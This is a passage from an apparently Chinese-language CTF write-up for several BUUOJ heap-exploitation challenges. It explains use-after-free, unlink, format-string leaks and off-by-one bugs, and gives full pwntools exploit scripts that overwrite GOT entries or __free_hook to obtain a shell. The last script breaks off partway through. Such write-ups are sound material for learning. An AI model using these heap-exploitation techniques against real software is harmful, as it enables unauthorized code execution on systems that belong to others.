      puts("#      ALL Down!      #");
      puts("#######################");
      return __readfsqword(0x28u) ^ v2;
    }
那么我们就可以先申请两次chunk，然后分别free掉，此时fastbins情况如下图，其中0x13d4320中存储了chunk1的地址，0x13d4240中存储了chunk0的地址，此时我们再一次进行申请，申请大小为0x10，由于FILO的原则，我们的
`ba` 会申请到0x13d4240的地址，如果我们将之前存储了flag的变量的地址写入，然后对chunk0进行输出，就可以将flag直接输出了。
exp:
    from pwn import *
    io = process('./gyctf_2020_some_thing_exceting')
    # io = remote('node3.buuoj.cn', 29924)
    def add(ba_length, ba, na_length, na):
        io.sendlineafter('want to do :', str(1))
        io.sendlineafter('ba\'s length : ', str(ba_length))
        io.sendlineafter('> ba : ', ba)
        io.sendlineafter('na\'s length : ', str(na_length))
        io.sendlineafter('> na : ', na)
    def delete(index):
        io.sendlineafter('want to do :', str(3))
        io.sendlineafter('> Banana ID : ', str(index))
    def display(index):
        io.sendlineafter('want to do :', str(4))
        io.sendlineafter('> SCP project ID : ', str(index))
        io.recvuntil('# Banana\'s ba is ')
    add(0x50, 'ba', 0x50, 'na') # 0
    add(0x50, 'ba', 0x50, 'na') # 1
    delete(0)
    delete(1)
    add(0x10, p64(0x6020a8), 0x10, 'na') # 2
    display(0)
    io.interactive()
## 0x0f hitcontraining_unlink
原题  
exp:
    from pwn import *
    context(log_level='debug', arch='amd64', os='linux')
    # io = process('./bamboobox')
    io = remote('node3.buuoj.cn', 29177)
    elf = ELF('./bamboobox')
    libc = ELF('./libc-2.23.so')
    free_got = elf.got['free']
    def show():
        io.sendlineafter('Your choice:', '1')
    def add(size, content):
        io.sendlineafter('Your choice:', '2')
        io.sendlineafter('Please enter the length of item name:', str(size))
        io.sendafter('Please enter the name of item:', content)
    def edit(index, size, content):
        io.sendlineafter('Your choice:', '3')
        io.sendlineafter('Please enter the index of item:', str(index))
        io.sendlineafter('Please enter the length of item name:', str(size))
        io.sendafter('Please enter the new name of the item:', content)
    def delete(index):
        io.sendlineafter('Your choice:', '4')
        io.sendafter('Please enter the index of item:', str(index))
    array = 0x6020C0
    add(0x30, 'aaaa')  # 0
    add(0x30, 'aaaa')  # 1
    add(0x80, 'aaaa')  # 2
    add(0x20, '/bin/sh')  # 3
    payload = p64(0) + p64(0x30) + p64(array + 0x18 - 0x18) + p64(array + 0x18 - 0x10)
    payload += 'a' * 0x10 + p64(0x30) + p64(0x90)
    edit(1, len(payload), payload)
    delete(2)
    # gdb.attach(io)
    edit(1, 0x100, p64(0x20) + p64(free_got))#1
    show()
    io.recvuntil('0 : ')
    puts_addr = u64(io.recvuntil(":")[:6].ljust(8,'\x00'))
    libc_base = puts_addr - libc.symbols['free']
    system = libc_base + libc.symbols['system']
    edit(0, 8, p64(system))
    delete(3)
    io.interactive()
## 0x10 axb_2019_heap
一道格式化字符串漏洞 + off-by-one的综合应用。
首先在banner函数中存在格式化字符串漏洞，可以找到偏移量为8，由于这题开启了PIE，所以我们可以利用格式化字符串漏洞来泄露出栈上的数据从而得到libc的基址和程序的基址。
    unsigned __int64 banner()
    {
      char format[12]; // [rsp+Ch] [rbp-14h] BYREF
      unsigned __int64 v2; // [rsp+18h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      puts("Welcome to note management system!");
      printf("Enter your name: ");
      __isoc99_scanf("%s", format);
      printf("Hello, ");
      printf(format);
      puts("\n-------------------------------------");
      return __readfsqword(0x28u) ^ v2;
    }
gdb调试观察栈上的数据，可以发现偏移为11处为 `` 的地址，可算出程序的基址。然后偏移为15处为
`` 的地址，可算出libc的基址。
解决了这个问题后，再来看看程序，有三个功能，添加、修改和删除，其中添加函数中对key值有一个判断，不等于43的话对申请的大小存在限制，不能小于等于0x80。
然后在edit函数中使用了get_input函数对chunk进行输入，最后的地方有一个判断 `if ( a2 + 1 > ', str(1))
        io.sendlineafter('create (0-10):', str(index))
        io.sendlineafter('size:\n', str(size))
        io.sendlineafter('content: \n', content)
    def delete(index):
        io.sendlineafter('>> ', str(2))
        io.sendlineafter('index:\n', str(index))
    def edit(index, content):
        io.sendlineafter('>> ', str(4))
        io.sendlineafter('index:\n', str(index))
        io.sendlineafter('content: \n', content)
        io.recvuntil('Done!')
    io.sendlineafter('name: ', '%11$p%15$p')
    io.recvuntil('Hello, ')
    base = int(io.recv(14), 16) - 0x1186
    libc_base = int(io.recv(14), 16) - libc.sym['__libc_start_main'] - 240
    note = base + 0x202060
    one_gadget = libc_base + 0x4526a
    free_hook = libc_base + libc.sym['__free_hook']
    print('libc -> ' + hex(libc_base))
    print('process_base -> ' + hex(base))
    add(0, 0x98, 'content')
    add(1, 0x98, 'content')
    add(2, 0x90, 'content')
    payload = p64(0) + p64(0x91) + p64(note - 0x18) + p64(note - 0x10)
    payload += p64(0) * 14 + p64(0x90) + '\xa0'
    edit(0, payload)
    delete(1)
    edit(0, p64(0) * 3 + p64(free_hook) + p64(0x10))
    edit(0, p64(one_gadget))
    delete(2)
    io.interactive()
## 0x11 ciscn_2019_final_2
在init函数中，程序读取了flag文件，然后将fd文件流改成了666。
    unsigned __int64 init()
    {
      int fd; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      fd = open("flag", 0);
      if ( fd == -1 )
      {
        puts("no such file :flag");
        exit(-1);
      }
      dup2(fd, 666);
      close(fd);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stdin, 0LL, 1, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      return __readfsqword(0x28u) ^ v2;
    }
分配函数中，我们只能申请两种类型的空间，int和short
int，分别分配0x20和0x10的空间，然后分别有一个全局指针指向分配的chunk，以及bool参数用来判断是否分配了chunk。
    unsigned __int64 allocate()
    {
      _DWORD *v0; // rbx
      int v2; // [rsp+4h] [rbp-1Ch]
      unsigned __int64 v3; // [rsp+8h] [rbp-18h]
      v3 = __readfsqword(0x28u);
      printf("TYPE:\n1: int\n2: short int\n>");
      v2 = get_atoi();
      if ( v2 == 1 )
      {
        int_pt = malloc(0x20uLL);
        if ( !int_pt )
          exit(-1);
        bool = 1;
        printf("your inode number:");
        v0 = int_pt;
        *v0 = get_atoi();
        *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt;
        puts("add success !");
      }
      if ( v2 == 2 )
      {
        short_pt = malloc(0x10uLL);
        if ( !short_pt )
          exit(-1);
        bool = 1;
        printf("your inode number:");
        *(_WORD *)short_pt = get_atoi();
        *((_WORD *)short_pt + 4) = *(_WORD *)short_pt;
        puts("add success !");
      }
      return __readfsqword(0x28u) ^ v3;
    }
在删除函数中，存在UAF漏洞。
    unsigned __int64 delete()
    {
      int v1; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      if ( bool )
      {
        printf("TYPE:\n1: int\n2: short int\n>");
        v1 = get_atoi();
        if ( v1 == 1 && int_pt )
        {
          free(int_pt);
          bool = 0;
          puts("remove success !");
        }
        if ( v1 == 2 && short_pt )
        {
          free(short_pt);
          bool = 0;
          puts("remove success !");
        }
      }
      else
      {
        puts("invalid !");
      }
      return __readfsqword(0x28u) ^ v2;
    }
在输出函数中，还有一个全局变量show_time限制了我们的输出次数限制，只能输出3次。
    unsigned __int64 show()
    {
      int v2; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v3; // [rsp+8h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      if ( show_time-- )
      {
        printf("TYPE:\n1: int\n2: short int\n>");
        v2 = get_atoi();
        if ( v2 == 1 && int_pt )
          printf("your int type inode number :%d\n", *(unsigned int *)int_pt);
        if ( v2 == 2 && short_pt )
          printf("your short type inode number :%d\n", (unsigned int)*(__int16 *)short_pt);
      }
      return __readfsqword(0x28u) ^ v3;
    }
在byebye函数中，会读取输入，然后进行输出，于是我们可以将标准输入流修改为666，这样在进行输入时就会输出flag文件了。
    void __noreturn bye_bye()
    {
      char v0[104]; // [rsp+0h] [rbp-70h] BYREF
      unsigned __int64 v1; // [rsp+68h] [rbp-8h]
      v1 = __readfsqword(0x28u);
      puts("what do you want to say at last? ");
      __isoc99_scanf("%99s", v0);
      printf("your message :%s we have received...\n", v0);
      puts("have fun !");
      exit(0);
    }
我们可以先通过double free，来泄露出heap的地址，然后让short chunk的fd指针指向一块int
chunk的content的地址，然后对其size位进行修改，然后用这块被修改了size位的chunk去填充tcachebins，然后使得之后的chunk在free后进入unsortbin中，然后泄露出libc的基址。
之后double free分配到stdin的位置，修改其为666，就可以输出flag了。
exp:
    from pwn import *
    # io = process('./ciscn_final_2',env={"LD_PRELOAD":"./libc-2.27.so"})
    io = remote('node3.buuoj.cn', 28685)
    libc = ELF('./libc-2.27.so')
    def add(add_type, add_num):
        io.sendlineafter('which command?\n> ', '1')
        io.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(add_type))
        io.sendafter('your inode number:', str(add_num))
    def delete(remove_type):
        io.sendlineafter('which command?\n> ', '2')
        io.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(remove_type))
    def display(show_type):
        io.sendlineafter('which command?\n> ', '3')
        io.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(show_type))
        if show_type == 1:
            io.recvuntil('your int type inode number :')
        elif show_type == 2:
            io.recvuntil('your short type inode number :')
        return int(io.recvuntil('\n', drop=True))
    add(1,0x30)
    delete(1)
    add(2,0x20)